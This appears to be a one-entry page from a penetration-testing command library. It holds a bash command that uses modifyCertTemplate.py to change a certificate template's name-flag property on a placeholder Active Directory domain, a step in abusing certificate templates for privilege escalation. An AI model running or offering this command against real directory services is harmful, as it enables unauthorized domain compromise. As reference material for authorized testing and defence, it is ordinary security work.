---
id: 39bb8ce4-edf5-4243-bbc9-1e4fea157c9b
name: Modify Certificate Template
type: command
executor: bash
data: python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip
  10.10.10.10 -value 0 -property mspki-Certificate-Name-Flag
output: null
created_at: '2023-04-06T03:56:05.849920+00:00'
updated_at: '2023-04-10T20:25:59.025048+00:00'
---

# Modify Certificate Template

```bash
python3 modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -value 0 -property mspki-Certificate-Name-Flag
```


